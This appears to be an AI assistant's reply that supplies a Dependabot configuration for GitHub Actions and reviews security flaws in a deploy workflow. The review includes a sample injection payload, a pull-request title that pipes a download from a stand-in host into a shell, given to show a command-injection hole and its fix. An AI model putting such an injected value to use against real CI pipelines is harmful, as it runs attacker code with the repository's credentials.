I couldn't create the file because this session has no file-write tool. Save the content below as `.github/dependabot.yml`:

```yaml
---
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    cooldown:
      default-days: 7
    groups:
      github-actions:
        patterns:
          - "*"
    commit-message:
      prefix: "ci"
    labels:
      - "dependencies"
      - "github-actions"
```

What each part does:
- **`directory: "/"`**: Dependabot looks in `.github/workflows/` from here. Your only workflow is `.github/workflows/deploy.yml`, so this covers it.
- **`cooldown: default-days: 7`**: Dependabot only proposes a release after it has been out for a week. That gives time for a compromised or broken release to be noticed before it reaches your CI.
- **`groups`**: all action updates arrive as one PR per week instead of one PR per action.
- **`labels`**: the labels must already exist in the repo. If they don't, delete that block.

I haven't validated this file or seen Dependabot run on it. Once it's on `main`, check under **Insights → Dependency graph → Dependabot** that it parsed.

### Problems in `deploy.yml`
I didn't change these, but you should know about them. Dependabot keeps actions up to date; it does nothing about the following:

1. **Line 14 lets anyone opening a pull request run commands.** `echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title straight into the shell script. A title like `"; curl evil.sh | sh; "` would run. Pass it through `env:` instead, e.g. `env: PR_TITLE: ${{ github.event.pull_request.title }}` and then `run: printf 'Title is %s\n' "$PR_TITLE"`.
2. **Line 7, `permissions: write-all`**, gives the job's token far more access than it needs. Use `permissions: {}` at the top and `contents: read` on the job.
3. **Line 13, `actions/checkout@v4`**, uses a tag, and tags can be moved to point at different code. Pin it to a full commit SHA with the version in a comment. Dependabot will keep SHA pins updated too. `v4` is also probably out of date.
4. Checkout should also have `persist-credentials: false`, and the job needs a `timeout-minutes` (the default is 6 hours).

I can apply these `deploy.yml` fixes as well if you want. Pinning the SHA requires looking up the current release with `gh api`, and I don't have a shell in this session.
